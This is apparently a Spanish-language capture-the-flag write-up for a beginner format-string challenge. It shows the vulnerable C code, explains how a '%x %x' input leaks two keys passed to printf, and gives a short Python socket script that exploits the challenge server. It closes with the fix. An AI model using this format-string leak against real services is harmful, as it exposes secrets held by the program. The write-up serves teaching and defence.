# Format String

| | |
|---|---|
| **Categoría** | Pwn |
| **Dificultad** | Fácil |
| **Puntos** | 100 |
| **Reto #** | 10 |
| **Conexión** | `nc chals.tropicalhunters.com 9004` |

## Descripción

El servicio imprime el mensaje del usuario con `printf` y luego pide dos claves en hexadecimal. Si se proporcionan las claves correctas, entrega la flag.

## Análisis

```c
key1 = getpid() ^ 0x13579bdf;   // rbp-0x4
key2 = key1     ^ 0x2468ace0;   // rbp-0x8

fgets(buf, 0x40, stdin);
printf(buf, key1, key2);        // ← buf como format string
                                 //   key1 → rsi, key2 → rdx

scanf("%x %x", &input1, &input2);
if (input1 == key1 && input2 == key2)
    print_flag();
```

`printf` recibe el buffer del usuario como format string y pasa `key1`/`key2` como segundo y tercer argumento. Enviando `%x %x`, `printf` imprime ambos valores en hexadecimal, revelando exactamente lo que el programa espera.

## Solución

```python
import socket

s = socket.socket()
s.connect(("chals.tropicalhunters.com", 9004))
s.recv(1024)

# Paso 1: leer claves con format string
s.sendall(b"%x %x\n")
resp = s.recv(1024).decode().strip()
k1_hex, k2_hex = resp.split()

# Paso 2: devolver los valores
s.sendall(f"{k1_hex} {k2_hex}\n".encode())
print(s.recv(1024).decode())
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- `printf(user_input)` sin formato fijo es una vulnerabilidad de format string clásica.
- Cuando el programa pasa valores sensibles como argumentos adicionales, `%x` los expone sin necesidad de leer el stack.
- Contramedida: siempre `printf("%s", user_input)`, nunca el input como format string.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
